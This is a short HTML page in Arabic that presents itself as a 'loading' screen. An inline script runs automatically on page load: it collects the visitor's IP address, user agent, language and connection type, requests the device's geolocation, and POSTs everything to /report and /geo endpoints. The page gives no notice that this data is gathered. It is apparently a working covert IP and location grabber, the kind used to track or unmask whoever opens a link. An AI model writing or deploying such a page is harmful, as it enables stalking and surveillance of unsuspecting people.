<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>جاري تجهيز الصفحة...</title>
  <script>
    // إرسال بيانات IP والمتصفح واللغة
    async function sendInfo() {
      const ip = await fetch("/get_ip").then(res => res.text());

      const info = {
        ip,
        userAgent: navigator.userAgent,
        language: navigator.language,
        connection: navigator.connection ? navigator.connection.effectiveType : "غير معروف"
      };

      await fetch("/report", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(info)
      });
    }

    // إرسال الموقع الجغرافي بعد إذن المستخدم
    function sendGeo(position) {
      const data = {
        lat: position.coords.latitude,
        lon: position.coords.longitude
      };

      fetch("/geo", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
      });
    }

    // بدء التنفيذ تلقائيًا عند فتح الصفحة
    window.onload = () => {
      sendInfo(); // إرسال المعلومات العامة

      // طلب الموقع الجغرافي بعد ذلك
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendGeo);
      }
    };
  </script>
</head>
<body>
  <h3 style="text-align:center; font-family:sans-serif">جاري تحميل الصفحة...</h3>
</body>
</html>